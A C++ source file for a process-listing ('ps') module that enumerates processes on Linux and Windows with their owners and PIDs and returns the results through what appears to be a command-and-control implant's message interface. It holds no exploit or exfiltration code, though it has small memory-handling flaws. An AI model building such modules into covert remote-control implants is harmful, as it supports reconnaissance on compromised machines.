#include "ListProcesses.hpp"

#include <cstring>
#include <string>
#include <array>

#ifdef __linux__

#include <pwd.h>
#include <grp.h>

#include <unistd.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>

#include <sstream>
#include <iostream>
#include <cstdlib>
#include <cstring>
#include <cstdarg>

#elif _WIN32

#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>

#endif

using namespace std;


#ifdef __linux__

#define PROC_DIRECTORY "/proc/"

int IsNumeric(const char* ccharptr_CharacterList)
{
    for ( ; *ccharptr_CharacterList; ccharptr_CharacterList++)
        if (*ccharptr_CharacterList < '0' || *ccharptr_CharacterList > '9')
            return 0;
    return 1;
}

std::string GetProcess()
{
    std::string result;
   
    DIR* dir_proc = opendir(PROC_DIRECTORY) ;
    if (dir_proc == NULL)
        return result;

    struct dirent* dirEntity = NULL;
    while((dirEntity = readdir(dir_proc)))
    {
        if (dirEntity->d_type == DT_DIR)
        {
            if (IsNumeric(dirEntity->d_name))
            {
                std::string CommandLinePath = PROC_DIRECTORY;
                CommandLinePath+=dirEntity->d_name;
                CommandLinePath+="/cmdline";

                struct stat info;
                stat(CommandLinePath.c_str(), &info);  // Error check omitted
                struct passwd *pw = getpwuid(info.st_uid);
                std::string owner = "";
                if(pw != 0)
                    owner = pw->pw_name;

                std::ifstream t(CommandLinePath);
                std::stringstream buffer;
                buffer << t.rdbuf();

                pid_t pid = (pid_t)atoi(dirEntity->d_name);
                std::string ProcessName = buffer.str();

                if(!ProcessName.empty())
                {
                    result += owner;
                    result += " "; 
                    result += std::to_string(pid);
                    result += " ";
                    result += ProcessName.substr(0,128);
                    result += "\n";
                }
            }
        }
    }
    closedir(dir_proc) ;
    return result;
}

#elif _WIN32

std::string getProcessInfos( DWORD processID )
{
    std::string result;

    TCHAR ProcessName[MAX_PATH] = TEXT("<unknown>");
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID );

    if (hProcess)
    {
        HMODULE hMod;
        DWORD cbNeeded;
        if ( EnumProcessModulesEx( hProcess, &hMod, sizeof(hMod), &cbNeeded, LIST_MODULES_ALL) )
        {
            GetModuleBaseName(hProcess, hMod, ProcessName, sizeof(ProcessName)/sizeof(TCHAR) );

            std::string arch = "x64";
            SYSTEM_INFO systemInfo = { 0 };
            GetNativeSystemInfo(&systemInfo);

            if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
                arch = "x86";
            else
            {
                BOOL bIsWow64 = FALSE;
                IsWow64Process(hProcess, &bIsWow64);
                if (bIsWow64)
                    arch = "x86";
                else
                    arch = "x64";
            }

            std::string acctName;
            std::string domainName;
            DWORD dwAcctName = 1;
            DWORD dwDomainName = 1;
            HANDLE tokenHandle;

            if (OpenProcessToken(hProcess, TOKEN_READ, &tokenHandle))
            {
                TOKEN_USER tokenUser;
                ZeroMemory(&tokenUser, sizeof(TOKEN_USER));
                DWORD tokenUserLength = 0;

                PTOKEN_USER pTokenUser;
                GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS::TokenUser, NULL,      
                0, &tokenUserLength);
                pTokenUser = (PTOKEN_USER) new BYTE[tokenUserLength];

                if (GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS::TokenUser, pTokenUser, tokenUserLength, &tokenUserLength))
                {
                    TCHAR szUserName[_MAX_PATH];
                    DWORD dwUserNameLength = _MAX_PATH;
                    TCHAR szDomainName[_MAX_PATH];
                    DWORD dwDomainNameLength = _MAX_PATH;
                    SID_NAME_USE sidNameUse;
                    LookupAccountSid(NULL, pTokenUser->User.Sid, szUserName, &dwUserNameLength, szDomainName, &dwDomainNameLength, &sidNameUse);
                    acctName=szUserName;
                    domainName=szDomainName;
                    delete pTokenUser;
                }
            }

            std::string processName = ProcessName;
            std::string account;
            if (!domainName.empty())
            {
                account += domainName;
                account += "\\";
            }
            if (!acctName.empty())
            {
                account += acctName;
                account += " ";
            }
            result += account;
            int size = max(1, (int)(30 - account.size()));
            result += std::string(size, ' ');
            result += arch;
            result += " ";
            result += processName;
            size = max(1, (int)(40 - processName.size()));
            result += std::string(size, ' ');
            result += std::to_string(processID);
            result += "\n";
        }
    }

    CloseHandle( hProcess );

    return result;
}


std::string GetProcess()
{
    std::string result;

    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
        return result;

    cProcesses = cbNeeded / sizeof(DWORD);
    for (i = 0; i < cProcesses; i++)
    {
        if (aProcesses[i] != 0)
            result += getProcessInfos(aProcesses[i]);
    }

    return result;
}


#endif



const std::string moduleName = "ps";


#ifdef _WIN32

__declspec(dllexport) ListProcesses* ListProcessesConstructor() 
{
    return new ListProcesses();
}

#endif

ListProcesses::ListProcesses()
	: ModuleCmd(moduleName)
{
}

ListProcesses::~ListProcesses()
{
}

std::string ListProcesses::getInfo()
{
	std::string info;
	info += "ps:\n";
	info += "ListProcesses\n";
	info += "exemple:\n";
	info += "- ps\n";

	return info;
}

int ListProcesses::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
	c2Message.set_instruction(splitedCmd[0]);
	c2Message.set_cmd("");

	return 0;
}

int ListProcesses::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	std::string outCmd = listProcesses();

	c2RetMessage.set_instruction(m_name);
	c2RetMessage.set_cmd("");
	c2RetMessage.set_returnvalue(outCmd);

	return 0;
}


std::string ListProcesses::listProcesses()
{
    std::string result;

#ifdef __linux__

    result = GetProcess();

#elif _WIN32

    result = GetProcess();

#endif

	return result;
}